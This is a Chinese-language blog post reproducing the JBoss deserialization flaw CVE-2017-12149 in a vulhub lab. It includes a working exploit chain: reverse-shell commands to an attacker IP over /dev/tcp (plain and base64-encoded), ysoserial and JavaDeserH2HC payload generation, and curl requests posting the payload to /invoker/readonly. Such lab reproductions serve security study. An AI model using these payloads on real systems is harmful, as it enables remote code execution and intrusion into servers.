---
layout: post
title: JBoss 5.x/6.x 反序列化漏洞
tags: JBoss
categories: CVE-2017-12149
---

# JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）

## 漏洞描述

该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。该漏洞出现在/invoker/readonly请求中，服务器将用户提交的POST内容进行了Java反序列化：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937429654740.jpg)

检测invoker/readonly目录是否存在，若返回500 一般就是漏洞存在

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937582712811.jpg)

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
环境启动后访问`http://your-ip:8080`可以看到JBoss默认页面

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937484961157.jpg)

1.使用exp

`git clone https://github.com/yunxu1/jboss-_CVE-2017-12149`下载到本地，运行`java -jar jboss反序列化_CVE-2017-12149.jar`打开工具，先进行检测是否存在漏洞，如果存在漏洞，然后执行命令

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937489229545.jpg)

2.构造反序列化语句反弹shell

编写反弹shell语句
`bash -i >& /dev/tcp/攻击机IP/监听端口 0>&1`程序是java的Runtime.getRuntime().exec()语句中不能包含管道符等，所以需要将反弹shell语句编码
编码网站：<http://www.jackson-t.ca/runtime-exec-payloads.html>

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937613794310.jpg)

然后利用[ysoserial](https://github.com/frohoff/ysoserial)生成反序列化ser文件

首先下载下来的是源码需要编译

```
git clone https://github.com/frohoff/ysoserial

cd ysoserial

mvn clean package -DskipTests
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937617849397.jpg)

编译完成后生成target文件，

```
//进入target

cd target/

//使用ysoserial-0.0.6-SNAPSHOT-all.jar生成反序列化文件poc.ser

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}" > poc.ser

//通过POST请求将poc.ser文件发送至/invoker/readonly

curl http://your-ip:8080/invoker/readonly --data-binary @poc.ser
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937619516110.jpg)

同时攻击机本地开启监听，成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937623811778.jpg)

或者直接下载[yoserial的jar包](https://jitpack.io/com/github/frohoff/ysoserial/master-30099844c6-1/ysoserial-master-30099844c6-1.jar)

```
wget https://jitpack.io/com/github/frohoff/ysoserial/master-30099844c6-1/ysoserial-master-30099844c6-1.jar

java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}" > poc.ser

curl http://127.0.0.1:8080/invoker/readonly --data-binary @poc.ser
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937625854190.jpg)

或者通过burp发送数据包，右键点击paste from file导入poc.ser文件内容进行发送

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937685964085.jpg)

在本地开启监听，成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937627303426.jpg)

3.使用[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC.git)

```
git clone https://github.com/joaomatosf/JavaDeserH2HC.git

cd JavaDeserH2HC/
```

然后编译生成反序列化文件

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java

java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 攻击机IP:监听端口

//生成反序列化ser文件
Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser

//通过POST请求将ser文件发送至目标
curl 127.0.0.1:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937602403290.jpg)

成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-12149/15937605177037.jpg)

## 参考链接

https://www.jianshu.com/p/d8604eccab68